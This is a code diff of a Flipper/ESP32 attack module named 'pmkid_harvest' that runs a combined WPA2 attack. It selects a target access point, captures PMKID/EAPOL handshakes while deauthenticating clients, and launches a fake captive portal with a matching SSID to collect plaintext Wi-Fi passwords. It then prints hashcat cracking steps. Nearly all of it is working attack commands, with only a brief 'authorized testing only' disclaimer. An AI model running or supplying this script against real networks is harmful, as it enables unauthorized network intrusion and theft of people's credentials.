@@ -1,29 +1,19 @@
 # FlipperPwn Module — PMKID Harvest + Parallel Portal
-# NOVEL: Dual-vector WPA2 attack — simultaneously:
-#   - PMKID/EAPOL capture (offline crackable hash)
-#   - Evil portal with matching SSID (cleartext credential harvest)
+# Dual-vector WPA2 attack:
+#   - PMKID/EAPOL capture (offline-crackable hash for hashcat/john)
+#   - Evil portal with matching SSID (plaintext credential harvest)
+# Running both maximizes success: whichever yields first wins, and the deauth
+# used during capture also drives clients toward the portal.
 #
-# Why run both at once?
-#   PMKID capture gives you a hash for offline cracking (hashcat/john).
-#   The portal may yield the plaintext password directly — no cracking needed.
-#   Running both maximizes your chances: whichever succeeds first wins.
+# Output on the ESP32 SD card:
+#   /logs/pmkid_<ts>.pcap  — import to hashcat with -m 22000
+#   /logs/evil_portal.log  — plaintext captures from the portal
 #
-#   The deauth sent during PMKID capture (-d flag) also drives clients toward
-#   your portal, making them more likely to re-authenticate through the fake AP.
-#
-# Attack flow:
-#   1. Scan for APs
-#   2. Select target AP by index
-#   3. PMKID/EAPOL capture with forced deauth (-d flag)
-#   4. Portal launches simultaneously with matching SSID
-#   5. Results typed via HID + saved to SD card
-#
-# Output files on ESP32 SD card:
-#   /logs/pmkid_<timestamp>.pcap  — import to hashcat with -m 22000
-#   /logs/evil_portal.log         — plaintext captures from portal
+# Single `PLATFORM ALL` block (see evil_twin.fpwn for the why). Marauder command
+# names/flags vary by fork — adjust the WIFI_CMD lines to your ESP32 build.
 #
 # REQUIREMENTS:
-#   - ESP32 WiFi Dev Board + WiFi Marauder >= 1.6.0
+#   - ESP32 WiFi Dev Board + WiFi Marauder
 #   - AUTHORIZED TESTING ONLY — WPA2 key extraction is illegal without authorization
 
 NAME        pmkid_harvest
@@ -31,70 +21,56 @@ DESCRIPTION Dual-vector: PMKID hash capture + parallel evil portal for direct cr
 CATEGORY    credential
 PLATFORMS   WIN,MAC,LINUX
 
+# Note: .fpwn OPTION default values are single tokens (the parser splits on
+# spaces), so a full hashcat command line can't be a default — it's printed in
+# the report below instead.
 OPTION AP_INDEX    0               "Target AP index from prior scanap"
 OPTION CAPTURE_SEC 60              "Seconds to run PMKID capture"
 OPTION PORTAL      isp_maintenance.html "Portal page (match target ISP if known)"
-OPTION HASHCAT_CMD hashcat -m 22000 -a 3 capture.pcap "hashcat command to run on recovered hash"
 
-# ── Phase 1: AP Recon ────────────────────────────────────────────────────────
-WIFI_SCAN
-WIFI_WAIT 10000
-WIFI_RESULT
+PLATFORM ALL
+IF_CONNECTED
+  # ── Phase 1: AP recon ───────────────────────────────────────────────────
+  PRINT Phase 1: Scanning APs...
+  LED_COLOR BLUE
+  WIFI_SCAN
+  WIFI_WAIT 10000
 
-# Brief pause — manually note the target AP index from scan results
-DELAY 3000
+  # ── Phase 2: PMKID + deauth ─────────────────────────────────────────────
+  # Select the target AP, start PMKID/EAPOL capture, then deauth to force the
+  # 4-way handshake. Runs for CAPTURE_SEC seconds.
+  PRINT Phase 2: PMKID capture AP {{AP_INDEX}}
+  LED_COLOR MAGENTA
+  WIFI_CMD select -a {{AP_INDEX}}
+  WIFI_WAIT 500
+  WIFI_CMD sniffpmkid
+  WIFI_WAIT 1000
+  WIFI_CMD attack -t deauth
+  WIFI_WAIT {{CAPTURE_SEC}}000
+  WIFI_STOP
 
-# Select the target AP so the PMKID capture / deauth is directed at it.
-WIFI_CMD select -a {{AP_INDEX}}
-WIFI_WAIT 500
+  # ── Phase 3: Portal (plaintext vector) ──────────────────────────────────
+  PRINT Phase 3: Portal {{PORTAL}} active
+  LED_COLOR RED
+  WIFI_CMD evilportal -c set html /portals/{{PORTAL}}
+  WIFI_WAIT 500
+  WIFI_CMD evilportal -c start
+  WIFI_WAIT 3000
+  WIFI_STOP
 
-# ── Phase 2: PMKID + Deauth (runs for CAPTURE_SEC seconds) ──────────────────
-# Marauder's sniffpmkid captures PMKID/EAPOL from the selected AP.  The deauth
-# forces clients to re-authenticate, producing the 4-way handshake to capture.
-WIFI_CMD sniffpmkid
-WIFI_WAIT 1000
-WIFI_CMD attack -t deauth
-WIFI_WAIT {{CAPTURE_SEC}}000
-WIFI_STOP
-
-# ── Phase 3: Results Reporting ───────────────────────────────────────────────
-PLATFORM WIN
-  GUI r
-  DELAY 400
-  STRING notepad
-  ENTER
-  DELAY 800
+  # ── Phase 4: Report ─────────────────────────────────────────────────────
+  LED_COLOR CYAN
+  OPEN_NOTEPAD
+  DELAY 1500
   STRINGLN === PMKID Harvest Results ===
-  STRINGLN
   STRINGLN PCAP saved to ESP32 SD: /logs/pmkid_*.pcap
-  STRINGLN Portal log saved to: /logs/evil_portal.log
+  STRINGLN Portal log: /logs/evil_portal.log
   STRINGLN
-  STRINGLN To crack the PMKID hash offline:
+  STRINGLN Crack offline:
   STRINGLN   hcxpcapngtool -o hash.hc22000 capture.pcap
-  STRINGLN   {{HASHCAT_CMD}}
+  STRINGLN   hashcat -m 22000 -a 3 hash.hc22000
   STRINGLN
-  STRINGLN Check Flipper display for any plaintext captures from portal.
-  STRINGLN
-  STRINGLN Target AP index used: {{AP_INDEX}}
-  STRINGLN Portal deployed: {{PORTAL}}
-  ENTER
-
-PLATFORM MAC
-  GUI SPACE
-  DELAY 400
-  STRING textedit
-  ENTER
-  DELAY 1000
-  STRINGLN === PMKID Harvest Complete ===
-  STRINGLN PCAP → hcxpcapngtool -o hash.hc22000 capture.pcap
-  STRINGLN {{HASHCAT_CMD}}
-  STRINGLN Portal: {{PORTAL}} — check /logs/evil_portal.log
-
-PLATFORM LINUX
-  CTRL ALT t
-  DELAY 800
-  STRING echo "PMKID capture done. AP: {{AP_INDEX}}, Portal: {{PORTAL}}" | tee /tmp/pmkid_harvest.txt
-  ENTER
-  DELAY 400
-  STRING echo "Run: hcxpcapngtool -o hash.hc22000 capture.pcap && {{HASHCAT_CMD}}" >> /tmp/pmkid_harvest.txt
-  ENTER
+  STRINGLN Target AP index: {{AP_INDEX}}   Portal: {{PORTAL}}
+  LED_COLOR GREEN
+  PRINT Harvest complete — check Flipper + SD logs
+END_IF
